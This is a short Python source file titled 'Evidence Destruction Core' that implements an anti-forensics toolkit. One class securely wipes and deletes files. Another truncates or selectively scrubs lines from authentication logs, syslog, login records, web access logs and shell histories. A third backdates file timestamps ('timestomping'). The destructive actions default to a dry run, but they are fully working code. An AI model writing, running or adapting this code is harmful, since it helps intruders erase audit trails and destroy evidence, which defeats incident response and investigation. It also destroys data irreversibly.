"""Evidence Destruction Core"""
import os,hashlib,time,json,random,shutil
from datetime import datetime

class SecureWiper:
    def __init__(self,passes=3,method="random_fill"):
        self.passes=passes
        self.method=method
        self.wiped_files=[]
    
    def wipe_file(self,filepath,dry_run=True):
        if not os.path.exists(filepath): return {"error":"File not found"}
        size=os.path.getsize(filepath)
        result={"file":filepath,"size":size,"passes":self.passes,"method":self.method,"dry_run":dry_run}
        if dry_run:
            result["status"]="would_wipe"
            return result
        for p in range(self.passes):
            with open(filepath,"wb") as f:
                if self.method=="zero_fill": f.write(b"\x00"*size)
                elif self.method=="random_fill": f.write(os.urandom(size))
                f.flush(); os.fsync(f.fileno())
        os.remove(filepath)
        self.wiped_files.append(filepath)
        result["status"]="wiped"
        return result
    
    def wipe_directory(self,dirpath,dry_run=True):
        results=[]
        for root,dirs,files in os.walk(dirpath):
            for f in files:
                results.append(self.wipe_file(os.path.join(root,f),dry_run))
        return results

class LogCleaner:
    TARGETS=["/var/log/auth.log","/var/log/syslog","/var/log/wtmp","/var/log/lastlog",
             "/var/log/apache2/access.log","~/.bash_history","~/.zsh_history"]
    
    def clean_log(self,filepath,pattern=None,dry_run=True):
        if dry_run: return {"file":filepath,"status":"would_clean","dry_run":True}
        try:
            if pattern:
                with open(filepath) as f: lines=f.readlines()
                cleaned=[l for l in lines if pattern not in l]
                with open(filepath,"w") as f: f.writelines(cleaned)
                return {"file":filepath,"removed":len(lines)-len(cleaned)}
            else:
                open(filepath,"w").close()
                return {"file":filepath,"status":"truncated"}
        except PermissionError:
            return {"file":filepath,"error":"Permission denied"}

class TimestompEngine:
    def modify_timestamps(self,filepath,target_time=None,dry_run=True):
        if dry_run: return {"file":filepath,"status":"would_modify","dry_run":True}
        t=target_time or time.mktime(datetime(2020,1,1).timetuple())
        os.utime(filepath,(t,t))
        return {"file":filepath,"new_time":datetime.fromtimestamp(t).isoformat()}
